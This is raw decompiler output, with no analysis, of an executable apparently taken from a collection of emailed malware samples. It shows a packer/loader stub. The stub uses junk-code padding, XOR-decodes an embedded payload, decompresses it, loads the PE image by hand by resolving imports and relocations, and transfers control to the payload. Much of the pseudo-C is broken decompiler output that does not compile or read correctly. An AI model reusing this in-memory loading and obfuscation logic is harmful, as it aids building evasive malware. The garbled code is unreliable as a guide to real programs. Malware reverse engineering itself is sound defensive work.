/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0718/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401030 - 0x00401070
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401030(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    for(*L0040633C = 0; *L0040633C < A10; *L0040633C = eax) {
        *(A8 + *L0040633C) = *(Ac + *L0040633C);
        eax = *L0040633C + 1;
    }
}

/*	Procedure: 0x00401071 - 0x0040107F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401071()
{



}

/*	Procedure: 0x004010C5 - 0x004010CF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010C5()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 0040127a -> 004012b0 */
/*	Procedure: 0x004010D0 - 0x0040128F
 *	Argument size: 0
 *	Local size: 36
 *	Save regs size: 12
 */

__entry_point__()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    *L00406354 = 39821115;
    eax = 0;
    != ? 0x4010d9 : ;
    for(Vffffffec = 0; Vffffffec < 1; Vffffffec = Vffffffec + 1) {
        *L00406354 = 14233;
    }
    for(Vffffffe8 = 0; Vffffffe8 < 1; Vffffffe8 = Vffffffe8 + 1) {
        *L00406354 = 8931;
    }
    (save)0;
    Vfffffff4 = *__imp__GetModuleHandleA();
    (save) & Vfffffff8;
    (save)0x406280;
    (save)-2147483648;
    if(*__imp__RegOpenKeyA() != 0) {
        *L00000000 = 0;
    }
    Vfffffff0 = 0x402001;
    Vffffffe4 = *Vfffffff0;
    Vffffffe0 = *(Vfffffff0 + 4);
    for(Vfffffffc = 0; Vfffffffc < Vffffffe4; Vfffffffc = Vfffffffc + 8) {
        *L00406354 = -1904012648;
        ecx = 0;
        != ? 0x401189 : ;
        *L00406354 = -742791461;
        edx = 0;
        != ? 0x401197 : ;
        for(Vffffffdc = 0; Vffffffdc < 1; Vffffffdc = Vffffffdc + 1) {
            *L00406354 = 336278;
        }
        *(Vfffffff0 + Vfffffffc + 8) = *(Vfffffff0 + Vfffffffc + 8) ^ 987654321;
    }
    *L0040634C = L00401630(Vffffffe0);
    L004017F0(Vfffffff0 + 8, *L0040634C, Vffffffe4);
    *L00406340 = edi;
    *L00406338 = esi;
    *L00406348 = ebx;
    ecx = -1;
    *L00406350 = *%fs:ecx+0x19];
    ecx = 1;
    Vfffffffc = 0x401253;
    *L00406344 = ebp;
    L00401660(Vfffffffc - Vfffffff4, Vfffffff4);
    L004012B0( *L0040634C);
    edi = *L00406340;
    ebx = *L00406348;
    esp = *L00406344;
    esi = *L00406338;
    esp = esp + 4;
    goto ( *L00406358);
    return(0);
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401290 - 0x004012AF
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401290(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    *(ebp - 4) = *__imp__GetProcAddress(A8, Ac, ecx);
    return(*(ebp - 4));
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x004012B0 - 0x0040162A
 *	Argument size: -84
 *	Local size: 88
 *	Save regs size: 0
 */

L004012B0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    (save)"kernel32.dll";
    Vffffffb0 = *__imp__GetModuleHandleA();
    (save)"MapViewOfFileEx";
    (save)Vffffffb0;
    Vffffffec = *__imp__GetProcAddress();
    (save)"UnmapViewOfFile";
    (save)Vffffffb0;
    Vffffffc4 = *__imp__GetProcAddress();
    (save)"CreateFileMappingA";
    (save)Vffffffb0;
    Vfffffffc = *__imp__GetProcAddress();
    (save)"VirtualAlloc";
    (save)Vffffffb0;
    Vffffffbc = *__imp__GetProcAddress();
    (save)"LoadLibraryA";
    (save)Vffffffb0;
    Vffffffdc = *__imp__GetProcAddress();
    (save)"VirtualFree";
    (save)Vffffffb0;
    Vfffffff0 = *__imp__GetProcAddress();
    Vffffffac = A8;
    Vffffffc0 = A8 + *(Vffffffac + 60);
    Vffffffd4 = Vffffffc0 + ( *(Vffffffc0 + 20) & 65535) + 24;
    (save)64;
    (save)12288;
    (save) *(Vffffffc0 + 80);
    (save)0;
    Vffffffcc = Vffffffbc();
    eax = *(Vffffffc0 + 6) & 65535;
    40 = eax * eax;
    L00401030(Vffffffcc, A8, *(Vffffffac + 60) + eax + 312);
    for(Vfffffff4 = 0; Vfffffff4 < ( *(Vffffffc0 + 6) & 65535); Vfffffff4 = Vfffffff4 + 1) {
        if(*(Vffffffd4 + 20) != 0 && *(Vffffffd4 + 16) != 0) {
            eax = *(Vffffffd4 + 16) + *(Vffffffc0 + 60) - 1;
            ecx = Vffffffc0;
            edx = 0;
            *(ecx + 60) = *(ecx + 60) / *(ecx + 60);
            edx = *(ecx + 60) % *(ecx + 60);
            *(Vffffffc0 + 60) = *(Vffffffc0 + 60) * eax;
            L00401030(Vffffffcc + *(Vffffffd4 + 12), A8 + *(Vffffffd4 + 20), eax);
        }
        Vffffffd4 = Vffffffd4 + 40;
    }
    Vffffffac = Vffffffcc;
    Vffffffc0 = Vffffffac + *(Vffffffac + 60);
    (save)0;
    (save) *(Vffffffc0 + 80);
    (save)0;
    (save)4;
    (save)0;
    (save)-1;
    Vfffffff8 = Vfffffffc();
    for(Vffffffa8 = Vffffffcc + *(Vffffffc0 + 128); *(Vffffffa8 + 16) != 0; Vffffffa8 = Vffffffa8 + 20) {
        (save)Vffffffcc + *(Vffffffa8 + 12);
        Vffffffe4 = Vffffffdc();
        if(*Vffffffa8 == 0) {
            Vffffffd8 = Vffffffcc + *(Vffffffa8 + 16);
            Vffffffc8 = Vffffffcc + *Vffffffa8;
        } else {
            Vffffffd8 = Vffffffcc + *Vffffffa8;
            Vffffffc8 = Vffffffcc + *(Vffffffa8 + 16);
        }
        Vffffffe8 = 0;
        if(*(Vffffffa8 + 16) != 0 && *Vffffffa8 != 0) {
            Vffffffe8 = 1;
        }
        while(*Vffffffd8 != 0) {
            *Vffffffd8 = ecx = *Vffffffd8 & -2147483648 ? L00401290(Vffffffe4, *Vffffffd8 + Vffffffcc + 2) : L00401290(Vffffffe4, *Vffffffd8 & 2147483647);
            if(Vffffffe8 != 0) {
                *Vffffffc8 = *Vffffffd8;
            }
            Vffffffd8 = Vffffffd8 + 4;
            Vffffffc8 = Vffffffc8 + 4;
        }
    }
    (save) *(Vffffffc0 + 52);
    (save)0;
    (save)0;
    (save)0;
    (save)34;
    (save)Vfffffff8;
    *L00406334 = Vffffffec();
    if(*L00406334 == 0) {
        (save) *(Vffffffc0 + 52);
        if(*__imp__UnmapViewOfFile() == 0) {
            (save)32768;
            (save)0;
            (save) *(Vffffffc0 + 52);
            if(*__imp__VirtualFree() != 0) {
                goto L0040158b;
            }
            eax = 0;
            goto L00401625;
        }
L0040158b:
        (save) *(Vffffffc0 + 52);
        (save)0;
        (save)0;
        (save)0;
        (save)34;
        (save)Vfffffff8;
        *L00406334 = *__imp__MapViewOfFileEx();
        if(*L00406334 == 0) {
            (save)64;
            (save)12288;
            (save) *(Vffffffc0 + 80);
            (save) *(Vffffffc0 + 52);
            *L00406334 = *__imp__VirtualAlloc();
        }
    }
    (save)Vfffffff8;
    *__imp__CloseHandle();
    L00401030( *L00406334, Vffffffcc, *(Vffffffc0 + 80));
    L004017C0( *L00406334);
    *L00406358 = *L00406334 + *(Vffffffc0 + 40);
    *(Vffffffc0 + 40) = *L00406358;
    eax = 1;
L00401625:
}

/*	Procedure: 0x0040162B - 0x0040162F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040162B()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401630 - 0x00401657
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401630(A8)
/* unknown */ void  A8;
{



    *(ebp - 4) = 1;
    *(ebp - 4) = *__imp__VirtualAlloc(0, A8, 12288, 4, ecx);
    return(*(ebp - 4));
}

/*	Procedure: 0x00401658 - 0x0040165F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401658()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401660 - 0x004017B2
 *	Argument size: 8
 *	Local size: 32
 *	Save regs size: 4
 */

L00401660(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vffffffe0 = Ac;
    Vfffffff0 = Vffffffe0 + *(Vffffffe0 + 60);
    (save)"VirtualAlloc";
    (save)"kernel32.dll";
    (save) *__imp__GetModuleHandleA();
    Vffffffec = *__imp__GetProcAddress();
    (save)64;
    (save)12288;
    (save) *(Vfffffff0 + 80);
    (save)0;
    *L00406334 = Vffffffec();
    if(*L00406334 == 0) {
        eax = 2;
    } else {
        L00401030( *L00406334, Vffffffe0, *(Vfffffff0 + 80));
        Vffffffe8 = *L00406334 - Vffffffe0;
        if(*(Vfffffff0 + 164) != 0) {
            for(Vfffffff8 = Vffffffe0 + *(Vfffffff0 + 160); *(Vfffffff8 + 4) != 0; Vfffffff8 = Vfffffff8 + *(Vfffffff8 + 4)) {
                Vfffffff4 = *(Vfffffff8 + 4) - 8 >> 1;
                Vffffffe4 = Vfffffff8 + 8;
                for(Vfffffffc = 0; Vfffffffc < Vfffffff4; Vfffffffc = Vfffffffc + 1) {
                    if(( *(Vffffffe4 + Vfffffffc * 2) & 65535) >> 12 == 3) {
                        *( *L00406334 + *Vfffffff8 + ( *(Vffffffe4 + Vfffffffc * 2) & 65535 & 4095)) = *( *L00406334 + *Vfffffff8 + ( *(Vffffffe4 + Vfffffffc * 2) & 65535 & 4095)) + Vffffffe8;
                    }
                }
            }
        }
        goto (A8 + *L00406334);
    }
}

/*	Procedure: 0x004017B3 - 0x004017BF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004017B3()
{



}

/*	Procedure: 0x004017C0 - 0x004017E3
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004017C0(A8)
/* unknown */ void  A8;
{



    edx = 0;
    edx = *L00406350;
    eax = 154239892;
    *%ds:eax+0x8] = A8;
    return(*%ds:edx+eax+0xf6ce7c9c]);
}

/*	Procedure: 0x004017E4 - 0x004017EF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004017E4()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x004017F0 - 0x00401901
 *	Argument size: -132
 *	Local size: 144
 *	Save regs size: 0
 */

L004017F0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vffffff70;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff3;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vffffffff;



    Vfffffff8 = 1;
    Vfffffff3 = *A8;
    (save)"a JXQODFKJb";
    (save) & Vffffff70;
    *__imp__lstrcpyA();
    Vffffffec = 0;
    do {
        Vffffffff = *(A8 + Vfffffff8);
        Vfffffff8 = Vfffffff8 + 1;
        if((Vffffffff & 255) != (Vfffffff3 & 255)) {
            *(Ac + Vffffffec) = Vffffffff;
            eax = Vffffffec + 1;
            Vffffffec = eax;
        } else {
            if(( *(A8 + Vfffffff8) & 255) != 0) {
                Vfffffff8 = L00401910( & Vfffffff4, A8 + Vfffffff8) + Vfffffff8;
                eax = L00401910( & Vffffffe4, A8 + Vfffffff8) + Vfffffff8;
                Vfffffff8 = eax;
                for(Vffffffe8 = 0; Vffffffe8 < Vfffffff4; Vffffffe8 = eax) {
                    *(Ac + Vffffffec) = *(Ac + Vffffffec - Vffffffe4);
                    Vffffffec = Vffffffec + 1;
                    eax = Vffffffe8 + 1;
                }
            } else {
                *(Ac + Vffffffec) = Vfffffff3;
                eax = Vffffffec + 1;
                Vffffffec = eax;
                Vfffffff8 = Vfffffff8 + 1;
            }
        }
    } while(Vfffffff8 < A10);
}

/*	Procedure: 0x00401902 - 0x0040190F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401902()
{



}

/*	Procedure: 0x00401910 - 0x0040197F
 *	Argument size: -120
 *	Local size: 128
 *	Save regs size: 0
 */

L00401910(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffff80;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = 0;
    Vfffffff4 = 0;
    *__imp__lstrcpyA( & Vffffff80, "UZLLGKVKVDLHGA");
    do {
        Vfffffff8 = *Ac & 255;
        Ac = Ac + 1;
        Vfffffff0 = Vfffffffc << 7;
        Vfffffffc = Vfffffff8 & 127 | Vfffffff0;
        Vfffffff4 = Vfffffff4 + 1;
    } while(ecx = Vfffffff8 & 128);
    *A8 = Vfffffffc;
    return(Vfffffff4);
}

/*	Procedure: 0x00401980 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401980()
{



}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__RegOpenKeyA;
/* 0x00401008       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__MapViewOfFileEx;
/* 0x00401010       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00401014       0 */ /* unknown */ void 	__imp__UnmapViewOfFile;
/* 0x00401018       0 */ /* unknown */ void 	__imp__lstrcpyA;
/* 0x0040101c       0 */ /* unknown */ void 	__imp__VirtualFree;
/* 0x00401020       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00401024       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x004010d0       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
